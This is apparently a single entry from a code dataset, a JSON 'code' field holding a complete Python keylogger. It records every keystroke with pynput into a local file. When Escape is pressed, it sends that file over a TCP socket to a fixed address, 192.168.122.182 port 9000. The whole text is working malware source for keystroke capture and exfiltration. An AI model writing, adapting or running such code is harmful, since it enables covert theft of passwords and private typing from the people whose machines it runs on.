    "code": "import pynput\nfrom pynput.keyboard import Key, Listener\nimport socket\nimport threading\ndef on_press(key):\n    global logging_ended\n    if logging_ended or key == Key.esc:\n        return False\n    with open('keylogs.txt', 'a') as file_handle:\n        if key == Key.space:\n            file_handle.write(' ')\n        elif key == Key.enter:\n            file_handle.write('\\n')\n        else:\n            formatted_key = str(key).replace(\"'\", \"\")\n            file_handle.write(formatted_key)\n    print(f'Key {key} pressed')\ndef on_release(key):\n    global logging_ended\n    if key == Key.esc:\n        logging_ended = True\n        return False\ndef send_logs():\n    with open('keylogs.txt', 'rb') as file:\n        data = file.read()\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    try:\n        s.connect(('192.168.122.182', 9000))\n        s.sendall(data)\n        print('Logs sent successfully.')\n    except Exception as e:\n        print(f'Socket error: {e}')\n    finally:\n        s.close()\nlogging_ended = False\nlistener = Listener(on_press=on_press, on_release=on_release)\nthreading.Thread(target=listener.start).start()\ntry:\n    while not logging_ended:\n        pass\nfinally:\n    listener.stop()\n    if logging_ended:\n        send_logs()",
